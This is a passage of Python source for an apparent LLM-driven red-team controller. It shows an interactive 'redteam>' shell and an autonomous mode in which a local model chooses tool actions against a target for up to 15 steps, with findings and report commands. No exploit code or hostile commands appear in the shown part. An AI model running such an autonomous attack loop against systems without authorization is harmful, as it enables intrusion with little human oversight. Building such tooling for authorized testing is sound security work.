            print(f"\n{C.DIM}No history yet.{C.RESET}")
            return
        print(f"\n{C.BOLD}Session History:{C.RESET}")
        for entry in log:
            print(f"  {C.DIM}{entry}{C.RESET}")
        print()

    def _ai_step(self, user_input: str):
        """Run one AI → tool → output cycle."""
        action_data = self.llm.query_with_retry(user_input, self.last_output)

        if not action_data:
            log_error("Could not get a valid action from the LLM. Try rephrasing.")
            return

        action = action_data.get("action", "")
        log_ai(f"Decided: {action}")

        if action == "ask_user":
            print(f"\n{C.YELLOW}[AI asks]{C.RESET} {action_data.get('question', '')}")
            return

        if action in ("done", "summarize"):
            print(f"\n{C.GREEN}[AI]{C.RESET} {action_data.get('message', '')}")
            return

        output = self.dispatcher.dispatch(action_data)
        self.last_output = output

        print(f"\n{C.DIM}{'─'*60}{C.RESET}")
        print(output[:3000])
        if len(output) > 3000:
            print(f"{C.DIM}... [{len(output)-3000} bytes truncated]{C.RESET}")
        print(f"{C.DIM}{'─'*60}{C.RESET}")

    def run_interactive(self):
        banner()
        print(f"{C.CYAN}Model:{C.RESET} {self.llm.model}")
        print(f"{C.CYAN}Mode:{C.RESET}  Interactive")
        print(f"{C.DIM}Commands: findings | history | report <client> <tester> <scope> | exit{C.RESET}\n")

        if not self.llm.check_connection():
            log_error("Exiting — cannot connect to Ollama.")
            sys.exit(1)

        while True:
            try:
                user_input = input(f"\n{C.BOLD}{C.RED}redteam>{C.RESET} ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\n")
                log_info("Session ended.")
                break

            if not user_input:
                continue
            if user_input.lower() in ("exit", "quit"):
                log_info("Session ended.")
                break
            if user_input.lower() == "findings":
                self._print_findings()
                continue
            if user_input.lower() == "history":
                self._print_history()
                continue
            if user_input.lower().startswith("report "):
                parts  = user_input.split(" ", 3)
                client = parts[1] if len(parts) > 1 else "Client"
                tester = parts[2] if len(parts) > 2 else "Tester"
                scope  = parts[3] if len(parts) > 3 else "As authorized"
                result = self.dispatcher._generate_report(
                    {"client": client, "tester": tester, "scope": scope}
                )
                print(result)
                continue

            self._ai_step(user_input)

    def run_auto(self, goal: str):
        banner()
        print(f"{C.CYAN}Model:{C.RESET} {self.llm.model}")
        print(f"{C.CYAN}Mode:{C.RESET}  Autonomous")
        print(f"{C.CYAN}Goal:{C.RESET}  {goal}\n")

        if not self.llm.check_connection():
            log_error("Exiting — cannot connect to Ollama.")
            sys.exit(1)

        context = f"Begin the engagement. Goal: {goal}"

        for step in range(self.max_auto_steps):
            self.step = step + 1
            print(f"\n{C.YELLOW}{'━'*60}{C.RESET}")
            print(f"{C.YELLOW}Step {self.step}/{self.max_auto_steps}{C.RESET}")

            action_data = self.llm.query_with_retry(context, self.last_output)
            if not action_data:
                log_warn("Could not parse action — skipping step")
                context = "Your last response was not valid JSON. Return ONLY a JSON action."
                continue

            action = action_data.get("action", "")
            print(f"{C.BOLD}Action:{C.RESET} {action}")

            if action == "ask_user":
                question = action_data.get("question", "")
                print(f"\n{C.YELLOW}[AI asks]{C.RESET} {question}")
                answer = input(f"{C.BOLD}Your answer:{C.RESET} ").strip()
                context = f"Operator answered: {answer}"
                self.last_output = answer
                continue

            if action in ("done", "summarize"):
                msg = action_data.get("message", "")
                print(f"\n{C.GREEN}{'━'*60}")
                print(f"[AI SUMMARY]{C.RESET}")
                print(msg)
                print(f"{C.GREEN}{'━'*60}{C.RESET}")
                self._print_findings()
                break

            output = self.dispatcher.dispatch(action_data)
            self.last_output = output
            context = f"You just ran '{action}'. Here is the output. Decide your next action."

            print(f"\n{C.DIM}{'─'*60}{C.RESET}")
            print(output[:2000])
            if len(output) > 2000:
                print(f"{C.DIM}... [truncated]{C.RESET}")
            print(f"{C.DIM}{'─'*60}{C.RESET}")
        else:
            log_warn(f"Reached max steps ({self.max_auto_steps}). Stopping.")
            self._print_findings()


# ── Entry Point ────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="AI-Powered Red Team Controller — Ollama Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--model",     default=DEFAULT_MODEL, help="Ollama model name")
    parser.add_argument("--target",    default=None,          help="Default target for autonomous mode")
    parser.add_argument("--auto",      default=None,          help="Autonomous mode goal")
    parser.add_argument("--max-steps", type=int, default=15,  help="Max autonomous steps (default 15)")
    args = parser.parse_args()

    ai = RedTeamAI(model=args.model)
    ai.max_auto_steps = args.max_steps

    if args.auto:
        goal = args.auto
        if args.target and args.target not in goal:
            goal = f"{goal} — target: {args.target}"
        ai.run_auto(goal)
    else:
        ai.run_interactive()


if __name__ == "__main__":
    main()
